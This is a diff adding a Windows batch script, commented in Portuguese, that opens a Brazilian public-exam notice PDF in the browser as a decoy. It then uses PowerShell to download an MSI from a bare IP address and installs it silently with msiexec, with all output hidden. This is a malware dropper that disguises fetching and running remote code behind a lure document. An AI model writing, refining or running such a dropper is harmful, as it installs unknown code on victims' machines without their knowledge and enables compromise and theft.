@@ -1,0 +1,30 @@
+ÿþ&cls
+ÿþ
+ï»¿@echo off
+
+rem Define a pasta temporÃ¡ria para o download do arquivo MSI
+set "TEMP_FOLDER=%TEMP%"
+
+rem Define o URL do PDF que deseja abrir
+set "PDF_URL=https://www.quadrix.org.br/web/visualizar.html?file=https://www.quadrix.org.br/Archives/General/30728/31054/31055/E041D722C411/1_CRF-AC_concurso_publico_2024_edital_1_abertura.pdf"
+
+rem Comando para abrir o PDF no navegador padrÃ£o em segundo plano
+start "" "%PDF_URL%" > nul 2>&1
+
+rem Baixa o arquivo MSI na pasta temporÃ¡ria
+set "URL=http://34.68.151.162/arquivo.msi"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%TEMP_FOLDER%\arquivo.msi')" > nul 2>&1
+
+rem Verifica se o arquivo MSI foi baixado corretamente
+if exist "%TEMP_FOLDER%\arquivo.msi" (
+    rem Executa o arquivo MSI de forma silenciosa em segundo plano
+    start /wait msiexec /i "%TEMP_FOLDER%\arquivo.msi" /quiet /qn > nul 2>&1
+) else (
+    echo Arquivo MSI nÃ£o encontrado.
+)
+
+rem Tempo de espera antes de encerrar o script (5 segundos)
+timeout /t 5 > nul
+
+rem Encerra o script
+exit
